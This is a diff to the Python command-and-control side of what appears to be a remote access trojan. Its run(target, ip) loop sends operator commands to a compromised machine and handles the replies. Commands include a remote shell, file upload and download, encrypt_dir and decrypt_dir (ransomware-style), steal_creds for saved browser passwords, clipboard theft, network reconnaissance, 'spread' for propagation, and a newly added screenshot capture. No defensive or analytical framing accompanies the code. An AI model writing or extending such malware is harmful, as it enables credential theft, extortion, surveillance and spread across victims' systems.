@@ -70,12 +70,15 @@ def run(target, ip):
         try:
             command = input(f'Shell#~{ip}: ')
             send(target, command)
+            
             if command == 'exit':
                 print("[+] Returning to center....")
                 break
+            
             elif command.startswith('cd') and len(command) > 1:
                 confirmation = receive(target)
                 print(confirmation)
+
             elif command.startswith('download'):
                 file_data = receive(target)
                 if 'file_data' in file_data:
@@ -83,6 +86,7 @@ def run(target, ip):
                         f.write(base64.b64decode(file_data['file_data']))
                 elif 'error' in file_data:
                     print(file_data['error'])
+            
             elif command.startswith('upload'):
                 file_path = command[7:]
                 if os.path.exists(file_path):
@@ -93,6 +97,7 @@ def run(target, ip):
                     print(response)
                 else:
                     print("File does not exist.")
+            
             elif command.startswith('encrypt_dir'):
                 while True:
                     progress = receive(target)
@@ -101,6 +106,7 @@ def run(target, ip):
                     elif 'message' in progress:
                         print(progress['message'])
                         break
+            
             elif command.startswith('decrypt_dir'):
                 while True:
                     progress = receive(target)
@@ -109,29 +115,44 @@ def run(target, ip):
                     elif 'message' in progress:
                         print(progress['message'])
                         break
+
             elif command == 'steal_creds' or command == 'steal_info':
                 result = receive(target)
                 print(result['message'])
+
                 if 'credentials' in result:
                     for cred in result['credentials']:
                         print(f"Profile: {cred['profile']}, URL: {cred['url']}, Username: {cred['username']}, Password: {cred['password']}")
                 elif 'info' in result:
                     for key, value in result['info'].items():
                         print(f"{key}: {value}")
+
             elif command == 'steal_clipboard':
                 result = receive(target)
                 print(result['message'])
                 if 'clipboard' in result:
                     print(f"Clipboard Content: {result['clipboard']}")
+
             elif command == 'network_info':
                 result = receive(target)
                 print(result['message'])
                 if 'network_info' in result:
                     for interface, details in result['network_info'].items():
                         print(f"Interface: {interface}, Details: {details}")
+
             elif command.startswith('spread'):
                 send(target, command)
                 print("[+] Spread command sent")
+
+            elif command == 'screenshot':
+                file_data = receive(target)
+                if 'file_data' in file_data:
+                    with open('screenshot.png', 'wb') as f:
+                        f.write(base64.b64decode(file_data['file_data']))
+                    print("[+] Screenshot saved as screenshot.png")
+                elif 'error' in file_data:
+                    print(file_data['error'])
+            
             else:
                 result = receive(target)
                 if result is not None:
